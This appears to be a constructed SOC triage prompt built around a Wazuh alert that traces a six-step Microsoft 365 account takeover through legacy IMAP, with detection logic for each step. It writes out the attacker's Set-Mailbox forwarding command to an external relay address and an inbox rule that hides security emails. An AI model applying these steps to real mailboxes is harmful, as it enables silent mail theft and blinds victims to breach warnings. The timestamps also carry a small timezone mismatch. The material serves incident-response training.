Investigate this Wazuh alert:

{
  "severity": "high",
  "network_observations": [
    {"ip": "91.219.236.87", "inferred_role": "external_attacker_source_legacy_imap_authentication", "first_seen": "2027-11-08T02:08:42+0100", "last_seen": "2027-11-08T02:38:18+0100"}
  ],
  "attack_progression": [
    {"step": 1, "tactic": "Initial Access / Valid Accounts — Cloud Accounts", "technique": "T1078.004 + T1556.005", "what_happened": "At 2027-11-08 02:08:42 CEST, Wazuh's azure-logs module ingested an Entra ID (Azure AD) signinLogs event: targetUser=emma.l@corp.com, AuthenticationProtocol=IMAP4, ClientAppDisplayName='Other Clients (IMAP)', IpAddress=91.219.236.87, status=Success, MFA_Result=MfaNotRequired. The signin SUCCEEDED on the FIRST attempt because legacy IMAP4 authentication does NOT honor Conditional Access policies and does NOT enforce MFA — the legacy authentication endpoint bypasses the entire Conditional Access / MFA control stack. The credentials used were valid (likely sourced from a historical breach corpus — emma.l's password was previously exposed in a collection #1 / haveibeenpwned-class dataset). The legitimate user emma.l has NEVER used IMAP in her authentication history (her client baseline is Outlook + OWA = Modern Authentication only) — IMAP usage from any IP is a behavioral anomaly, and IMAP from a hosted-server IP in RO is explicitly hostile.", "chain_reason": "Wazuh azure-logs decoder rule (MFA bypass via legacy protocol). Univariate signature: ClientAppDisplayName IN ('Other Clients (IMAP)', 'Other Clients (POP)', 'Other Clients (SMTP)', 'Authenticated SMTP', 'IMAP4', 'POP3') + status=Success + MFA_Result=MfaNotRequired + IpAddress NOT in known-corporate-egress list.", "first_seen": "2027-11-08T02:08:42+0100"},
    {"step": 2, "tactic": "Persistence / Account Manipulation — Mailbox Session", "technique": "T1098.002 + T1114.003", "what_happened": "At 02:11:18 CEST (~2 min 36 s after the signin success), Wazuh's azure-logs module ingested an Exchange Online unified audit event: User=emma.l, Operation=IdleSessionStart, ClientInfoString='Mozilla/4.0 IMAP-client', IpAddress=91.219.236.87. The attacker's IMAP client established a persistent mailbox session under emma.l's credentials. The ClientInfoString='Mozilla/4.0 IMAP-client' is the canonical signature of a non-Microsoft IMAP4 client (Microsoft's own Outlook/OWA presents a richer ClientInfoString with version + build); this is a third-party IMAP library (likely Python imaplib, MailKit, or a Telegram-channel-distributed IMAP grabber tool).", "chain_reason": "Exchange Online unified audit Operation=IdleSessionStart + ClientInfoString matching legacy / non-Microsoft IMAP signature + same IpAddress as the signin event = same attacker session continues from signin into mailbox-active.", "first_seen": "2027-11-08T02:11:18+0100"},
    {"step": 3, "tactic": "Collection / Persistence — Mail Forwarding Rule", "technique": "T1114.003 + T1098.002", "what_happened": "At 02:14:08 CEST (~5 min 26 s after signin), Wazuh's azure-logs module ingested an Exchange Online unified audit event: User=emma.l, Operation=Set-Mailbox, Parameters='-ForwardingSmtpAddress attacker-relay@protonmail.com -DeliverToMailboxAndForward $true', IpAddress=91.219.236.87. The attacker configured server-side mailbox forwarding: EVERY new email arriving in emma.l's mailbox is now silently forwarded to attacker-relay@protonmail.com AND delivered to emma.l's Inbox normally (so emma.l never notices). This is the SILENT EXFIL PIPE — the attacker no longer needs to maintain the IMAP session to receive emma.l's future mail; the rule operates server-side at Exchange. The DeliverToMailboxAndForward=$true is the defense-evasion flag — it prevents the victim from noticing missing mail.", "chain_reason": "Exchange Online unified audit Operation=Set-Mailbox + Parameters containing ForwardingSmtpAddress to an EXTERNAL domain (NOT a corp.com address) + DeliverToMailboxAndForward=$true. MITRE T1114.003 (Email Forwarding Rule) is the canonical persistence-via-mailbox-config technique.", "first_seen": "2027-11-08T02:14:08+0100"},
    {"step": 4, "tactic": "Collection / Bulk Mailbox Enumeration", "technique": "T1114.002", "what_happened": "At 02:18:42 CEST (~10 min after signin), Wazuh's azure-logs module ingested an Exchange Online unified audit event: User=emma.l, Operation=MailItemsAccessed, IpAddress=91.219.236.87, MailboxItemCount=1247 items in a rolling 4-minute window. emma.l's normal mailbox access pattern is interactive reading via Outlook (5-20 items per minute, with reading-pause gaps); 1247 items in 4 minutes = ~311 items/min = ~5.2 items/sec = automated IMAP enumeration of the entire mailbox (likely UID FETCH 1:* BODY[]). The attacker is downloading the historical mailbox contents in addition to subscribing to future mail via the forwarding rule.", "chain_reason": "Exchange Online unified audit Operation=MailItemsAccessed with rate >100 items/min OR cumulative count >500 items in 5 minutes for a single user from a single non-Outlook ClientInfoString = bulk mailbox enumeration signature.", "first_seen": "2027-11-08T02:18:42+0100"},
    {"step": 5, "tactic": "Defense Evasion — Inbox Rule (Hide Security Emails)", "technique": "T1564.008", "what_happened": "At 02:24:18 CEST (~15 min 36 s after signin), Wazuh's azure-logs module ingested an Exchange Online unified audit event: User=emma.l, Operation=New-InboxRule, Name='server log filter', Conditions='Subject contains password OR Subject contains login', Action='MoveToFolder RSS Feeds', IpAddress=91.219.236.87. The attacker created a client-side inbox rule that moves any inbound email with 'password' or 'login' in the subject line to the RSS Feeds folder (a rarely-checked legacy folder). This HIDES from emma.l the very emails she would receive if defenders detect the breach: password-reset notifications, security-alert emails from Microsoft, IT-team-cleanup messages. The rule name 'server log filter' is innocuous-looking to fool a casual victim review.", "chain_reason": "Exchange Online unified audit Operation=New-InboxRule + Action containing 'MoveToFolder RSS Feeds' OR 'MoveToFolder Deleted Items' OR 'PermanentDelete' + Conditions matching security keywords (password|login|security|verification|2FA|MFA) = classic hide-security-emails inbox rule.", "first_seen": "2027-11-08T02:24:18+0100"},
    {"step": 6, "tactic": "Persistence — Second IMAP Session", "technique": "T1078.004 + T1098.002", "what_happened": "At 02:38:18 CEST (~30 min after the first signin), Wazuh's azure-logs module ingested a SECOND Entra signinLogs event: targetUser=emma.l@corp.com, Operation=MailboxLogin, status=Success, AuthenticationProtocol=IMAP4, IpAddress=91.219.236.87. The attacker re-authenticated for a second IMAP session — likely to continue bulk enumeration or to verify the forwarding rule is operating. The second signin is structurally identical to the first (same IP, same legacy protocol, same MFA bypass) = the attacker is settling in for persistent access.", "chain_reason": "Second signin success with same IP + same user + same legacy protocol within 30 min = persistent session pattern. Univariate trigger: two or more legacy-protocol signin success events for the same user from the same IP within 1 hour.", "first_seen": "2027-11-08T02:38:18+0100"}
  ],
  "time_window": {"start": "2027-11-08T02:08:42+0100", "end": "2027-11-08T02:38:18+0100"},
  "alert_count": 6,
  "unique_steps": 6
}
